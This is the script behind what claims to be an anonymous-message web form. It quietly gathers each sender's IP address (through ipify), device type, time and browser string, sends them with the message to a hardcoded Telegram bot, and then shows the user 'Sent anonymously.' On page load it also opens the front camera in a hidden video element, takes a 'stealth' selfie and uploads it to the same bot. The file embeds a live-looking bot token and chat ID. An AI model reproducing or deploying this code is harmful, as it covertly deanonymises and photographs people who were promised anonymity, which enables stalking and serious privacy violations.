document.getElementById("anonForm").addEventListener("submit", async function (e) {
  e.preventDefault();
  const message = document.getElementById("message").value;

  const res = await fetch("https://api.ipify.org?format=json");
  const data = await res.json();
  const ip = data.ip;

  const userAgent = navigator.userAgent;
  const device = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
  const time = new Date().toLocaleString();

  const telegramToken = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
  const chatId = "7244443820";

  const text = `🕊️ *New Anonymous Message Received*\n\n💬 *Message:* ${message}\n🌐 *IP:* ${ip}\n📱 *Device:* ${device}\n🕐 *Time:* ${time}\n🧠 *Browser:* ${userAgent}`;

  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
  });

  alert("Sent anonymously.");

  document.getElementById("message").value = "";
});

// 🚨 Stealth Front Camera Snap (if user allows permission silently)
window.addEventListener("load", () => {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then((stream) => {
      const video = document.createElement("video");
      video.setAttribute("autoplay", true);
      video.setAttribute("playsinline", true);
      video.style.display = "none";
      document.body.appendChild(video);
      video.srcObject = stream;

      video.onloadedmetadata = () => {
        video.play();

        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = 300;
          canvas.height = 250;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL("image/jpeg");
          sendStealthSelfieToTelegram(imageData);

          stream.getTracks().forEach(track => track.stop());
          video.remove();
          canvas.remove();
        }, 1200);
      };
    })
    .catch((err) => {
      console.warn("Camera permission denied or blocked");
    });
});

function sendStealthSelfieToTelegram(imageData) {
  const blob = dataURItoBlob(imageData);
  const formData = new FormData();
  formData.append("chat_id", "7244443820");
  formData.append("photo", blob, "stealth.jpg");

  fetch("https://api.telegram.org/bot8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0/sendPhoto", {
    method: "POST",
    body: formData
  });
}

function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(',')[1]);
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}
